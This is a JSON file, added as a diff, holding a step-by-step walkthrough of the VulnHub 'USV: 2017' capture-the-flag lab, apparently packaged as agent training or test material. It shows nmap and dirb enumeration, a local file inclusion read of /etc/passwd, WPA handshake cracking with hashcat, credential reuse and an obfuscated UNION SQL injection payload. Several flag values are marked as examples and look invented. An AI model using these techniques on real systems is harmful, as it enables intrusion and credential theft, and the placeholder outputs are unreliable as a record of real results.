@@ -1,0 +1,101 @@
+{
+    "initial_prompt": "The 'USV: 2017' CTF challenge, hosted on VulnHub and created by Suceava University, involves capturing five flags, each presented in the format 'Country_name Flag: [md5 hash]'. Attacker Machine: Kali 2024. Target VM IP: 192.168.0.18 (note: IP discovery is typically required but 192.168.0.18 is used for this walkthrough). The challenge requires service enumeration, vulnerability exploitation (such as SQL injection and Local File Inclusion), password cracking, and file system navigation to retrieve all flags.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Discover open ports and services on the target machine to identify potential entry points. An aggressive scan (-A) will attempt OS detection, version detection, script scanning, and traceroute. Scanning all ports (-p-) ensures no service is missed.",
+            "command": "nmap -A -p- 192.168.0.18",
+            "result": "Nmap scan reveals multiple open ports: 21 (FTP), 22 (SSH), 80 (HTTP Apache), 4369 (epmd), 5222 (xmpp-client), 5269 (xmpp-server), 5280 (xmpp-http), 15020 (HTTPS Apache), and 33939 (unknown). Ports 80 (HTTP) and 15020 (HTTPS) are of immediate interest for web-based attacks."
+        },
+        {
+            "step_number": 2,
+            "thought": "Investigate the HTTP service on port 80. Fetch the main page to check for any obvious information or links.",
+            "command": "curl http://192.168.0.18",
+            "result": "The command fetches the HTML content of the root page on port 80. It displays a simple page with CSS animation ('CTF-USV 2017', 'safetech', Minions image). No interactive elements or immediate vulnerabilities are apparent from the rendered page or its source code."
+        },
+        {
+            "step_number": 3,
+            "thought": "Enumerate directories on the HTTP service (port 80) to find hidden pages or administrative interfaces.",
+            "command": "dirb http://192.168.0.18",
+            "result": "Dirb scan discovers a directory `/admin2` (HTTP 200). Visiting `http://192.168.0.18/admin2` in a browser (or via curl) reveals a login page. This will be investigated later if credentials are found."
+        },
+        {
+            "step_number": 4,
+            "thought": "Investigate the HTTPS service on port 15020. Start by examining the SSL certificate for any embedded information, as this is sometimes a location for CTF flags or hints.",
+            "command": "openssl s_client -connect 192.168.0.18:15020 </dev/null 2>/dev/null | openssl x509 -noout -issuer -subject -dates",
+            "result": "The command connects to the HTTPS port, retrieves the SSL certificate, and displays its issuer, subject, and validity dates. The original walkthrough mentions finding a flag in the issuer section. For example, output might be: `issuer=C = RO, ST = Suceava, L = Suceava, O = USV, OU = AC, CN = USV CA /emailAddress=contact@usv.ro / Austria Flag: d41d8cd98f00b204e9800998ecf8427e` (Example flag, actual flag content may vary and needs to be checked from the output). This is the 'Original Content's 2nd Flag'."
+        },
+        {
+            "step_number": 5,
+            "thought": "Enumerate directories on the HTTPS service (port 15020) to uncover hidden resources. Use `-k` with curl-based tools or equivalent for dirb if it has issues with self-signed certificates (though dirb often handles this).",
+            "command": "dirb https://192.168.0.18:15020",
+            "result": "Dirb scan on the HTTPS service (ignoring SSL errors if necessary) identifies `/blog` and `/vault` directories. `/blog` appears to be a web application, and `/vault` contains numerous subdirectories. These are potential areas for further investigation."
+        },
+        {
+            "step_number": 6,
+            "thought": "Explore the `/blog` directory found on port 15020. Look for hints related to vulnerabilities or flags, particularly comments or unusual pages.",
+            "command": "curl -k https://192.168.0.18:15020/blog/",
+            "result": "Fetching the main blog page. The original walkthrough indicates that by browsing the blog (specifically Kevin's blog and its comments/source code), a hint towards a `download.php` file is found, which might be vulnerable to LFI. The output of this curl command would need to be manually inspected or grepped for such hints (e.g., `curl -k https://192.168.0.18:15020/blog/ | grep download.php`)."
+        },
+        {
+            "step_number": 7,
+            "thought": "Test the `/blog/download.php` endpoint (discovered from blog exploration) for Local File Inclusion (LFI) by attempting to read `/etc/passwd`.",
+            "command": "curl -k -X POST -d \"image=/etc/passwd\" https://192.168.0.18:15020/blog/download.php",
+            "result": "The server responds with the content of `/etc/passwd`, confirming the LFI vulnerability. This allows reading arbitrary files from the server, which is critical for finding flags or configuration files."
+        },
+        {
+            "step_number": 8,
+            "thought": "Exploit the LFI vulnerability to retrieve the first country-named flag, which is hinted to be in `/home/kevin/flag.txt`.",
+            "command": "curl -k -X POST -d \"image=/home/kevin/flag.txt\" https://192.168.0.18:15020/blog/download.php",
+            "result": "The command successfully retrieves the file content: \"Phillippines Flag: 551d3350f100afc6fac0e4b48d44d380\". This is the first of the target country-named flags."
+        },
+        {
+            "step_number": 9,
+            "thought": "The `/vault` directory on port 15020 was noted as being large. Download its contents recursively for offline analysis. Use `-nH` to prevent creating host-prefixed directories and `--cut-dirs=1` to avoid including `15020/` in the local path, placing the `vault` directory directly in the current working directory.",
+            "command": "wget -r --no-check-certificate -nH --cut-dirs=1 https://192.168.0.18:15020/vault/",
+            "result": "wget downloads the entire `/vault` directory structure and files into a local directory named `vault`. This allows for easier searching and analysis of its contents."
+        },
+        {
+            "step_number": 10,
+            "thought": "Search the downloaded `vault` directory for non-HTML files that might be interesting, such as archives or capture files.",
+            "command": "find vault/ -type f ! -name \"*.html\" ! -name \"*.htm\"",
+            "result": "The `find` command lists files within the `vault/` directory, excluding HTML files. Notable files discovered are `vault/rockyou.zip` (a compressed wordlist) and `vault/ctf.cap` (a Wi-Fi handshake capture file)."
+        },
+        {
+            "step_number": 11,
+            "thought": "Extract the `rockyou.txt` wordlist from the `rockyou.zip` archive. This wordlist will be used for password cracking.",
+            "command": "unzip vault/rockyou.zip -d vault/",
+            "result": "The `rockyou.zip` archive is extracted, creating `vault/rockyou.txt`. This wordlist is now available for use with password cracking tools."
+        },
+        {
+            "step_number": 12,
+            "thought": "Convert the Wi-Fi capture file `ctf.cap` to the `.hccapx` format required by Hashcat for WPA/WPA2 handshake cracking. `cap2hccapx` is part of `hcxtools`.",
+            "command": "cap2hccapx vault/ctf.cap vault/ctf.hccapx",
+            "result": "The file `vault/ctf.cap` is converted into `vault/ctf.hccapx`. If `hcxtools` is not installed, it can be installed via `sudo apt update && sudo apt install hcxtools`. The output will confirm successful conversion or list errors if the .cap file does not contain a valid handshake."
+        },
+        {
+            "step_number": 13,
+            "thought": "Crack the WPA/WPA2 handshake in `ctf.hccapx` using Hashcat with the extracted `rockyou.txt` wordlist. Mode `-m 2500` is for WPA/WPA2.",
+            "command": "hashcat -m 2500 -a 0 vault/ctf.hccapx vault/rockyou.txt",
+            "result": "Hashcat initiates the cracking process. After some time, it should recover the password. The cracked password is \"minion.666\". This password might be reusable for other services, like the `/admin2` login page."
+        },
+        {
+            "step_number": 14,
+            "thought": "Attempt to log into the `/admin2` page (found on port 80) using the cracked Wi-Fi password \"minion.666\" and a common username like \"admin\".",
+            "command": "curl -X POST --data \"username=admin&password=minion.666\" http://192.168.0.18/admin2/",
+            "result": "The POST request submits the credentials. The server response is the HTML content of the admin page after successful login. The original walkthrough indicates that the second country-named flag is embedded in the source code of this page."
+        },
+        {
+            "step_number": 15,
+            "thought": "Inspect the HTML source code obtained from the successful login to `/admin2` to find the embedded flag.",
+            "command": "curl -s -X POST --data \"username=admin&password=minion.666\" http://192.168.0.18/admin2/ | grep Flag",
+            "result": "The output of the `curl` command (which is the HTML of the admin page) is piped to `grep` to search for lines containing 'Flag'. This should reveal the second flag: \"Croatia Flag: 7e8e2e2e8f2e6e8e2e8f2e6e8e2e8f2e\" (example hash, actual hash from output)."
+        },
+        {
+            "step_number": 16,
+            "thought": "Exploit a potential SQL injection vulnerability on the `/blog/admin/edit.php` page (on port 15020) to retrieve the final flag. The payload from the original walkthrough suggests `id=7` is significant and uses a UNION-based attack. The leading comma in the original payload `select%20,1,login,password,4...` is syntactically incorrect for standard SQL; it's interpreted here as trying to match 5 columns, with the first being NULL-like. Using `NULL` explicitly: `select%20NULL,1,login,password,4%20from%20users`. The flag is expected to be in the `login` or `password` field of a user retrieved by this query.",
+            "command": "curl -k \"https://192.168.0.18:15020/blog/admin/edit.php?id=7%20/*union*/union/*all*/all/*select*/select%20NULL,1,login,password,4%20from%20users%20order%20by%201%20limit%201,1\"",
+            "result": "The crafted URL with the SQL injection payload is sent to the server. The response contains data extracted via the SQL injection. By inspecting the output, the third country-named flag is found: \"Italy Flag: 9f2e6e8e2e8f2e6e8e2e8f2e6e8e2e8f\" (example hash, actual hash from output). This flag is likely retrieved from the `login` or `password` column of the `users` table for the user selected by `limit 1,1` (the second user)."
+        }
+    ]
+}
